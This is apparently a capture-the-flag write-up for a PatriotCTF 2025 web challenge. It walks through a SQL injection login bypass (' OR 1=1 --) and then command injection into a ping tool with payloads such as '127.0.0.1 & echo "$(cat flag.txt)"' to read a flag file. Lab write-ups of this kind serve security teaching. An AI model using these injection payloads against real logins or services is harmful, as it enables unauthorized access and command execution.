# PatriotCTF 2025 – Web Challenges Writeups
**Challenge 1: Connection Tester**  
**Author:** [Syndro/Ayco]  
**Category:** Web  
<img width="486" height="474" alt="image" src="https://github.com/user-attachments/assets/f153377f-33b5-4ba8-97cd-2c13fd7980f2" />

---
<img width="1145" height="291" alt="image" src="https://github.com/user-attachments/assets/d4bf979b-40ee-4515-9eea-c101dd5f33c7" />

### 1. Login Page – Classic SQL Injection
The site greets us with a simple login form.

**Payload**  
`Username:` `' OR 1=1 --`  
`Password:` anything

**Explanation**  
- `'` → closes the opening quote  
- `OR 1=1` → always true condition  
- `--` → comments out the rest of the query (password check ignored)

**Resulting SQL query**  
```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '...';
```
→ Instant admin login!
SQLi bypass

<img width="1169" height="216" alt="image" src="https://github.com/user-attachments/assets/bdb0e30c-d989-445f-b574-d535f029f4c1" />

2. Dashboard – Connection Tester (Ping Tool)
After login we get a dashboard with a "Test Connection" feature that pings any host we enter.
Trying 127.0.0.1 works perfectly → OS command execution confirmed.
Ping localhost

3. Discovering Command Injection
The backend runs something like:

<pre> /bin/sh -c "ping -c 4 <user_input>" </pre>

That's why simple ; ls, || ls, etc. fail — the input is treated as ping arguments.
Working separators: & and &&

4. Executing Arbitrary Commands
Since we're inside /bin/sh -c, we can chain commands with &:

<pre> 127.0.0.1 & echo "$(ls)" </pre>
→ Lists the current directory and reveals flag.txt.
Listing files

5. Reading the Flag

<pre>127.0.0.1 & echo "$(cat flag.txt)"</pre>

Flag captured
Flag: PCTF{...your_flag_here...}
